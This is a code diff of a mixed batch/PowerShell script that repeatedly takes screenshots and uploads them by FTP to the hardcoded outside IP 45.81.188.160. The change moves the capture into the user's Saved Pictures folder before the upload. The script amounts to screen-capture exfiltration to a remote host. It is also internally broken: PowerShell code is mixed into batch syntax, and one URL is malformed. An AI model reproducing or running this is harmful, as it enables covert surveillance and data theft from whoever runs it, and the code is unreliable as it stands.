@@ -19,6 +19,7 @@ timeout /t 5
 goto Start
 echo easy ip
 start chrome https://www/whatismyipaddress.com
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Drawing;
@@ -36,18 +37,15 @@ public class Screenshot {
     }
 }
 "@
+# Call the Capture method to take a screenshot and save it in the Saved Pictures folder
+[Screenshot]::Capture("%USERPROFILE%\Pictures\Saved Pictures\screenshot.png")
 
-# Call the Capture method to take a screenshot and save it in the specified location
-[Screenshot]::Capture("C:\RIL3\screenshot.png")
-:: Check if the RIL3 folder exists, if not, create it
-if not exist "C:\RIL3" (
-    mkdir "C:\RIL3"
-):: FTP script to send screenshot to your laptop
+:: FTP script to send screenshot to your laptop
 echo open 45.81.188.160 > ftp_commands.txt
 echo USERNAME >> ftp_commands.txt
 echo PASSWORD >> ftp_commands.txt
 echo binary >> ftp_commands.txt
-echo put C:\RIL3\screenshot.png /path/to/remote/directory/screenshot.png >> ftp_commands.txt
+echo put "%USERPROFILE%\Pictures\Saved Pictures\screenshot.png" /path/to/remote/directory/screenshot.png >> ftp_commands.txt
 echo bye >> ftp_commands.txt
 
 ftp -n -s:ftp_commands.txt
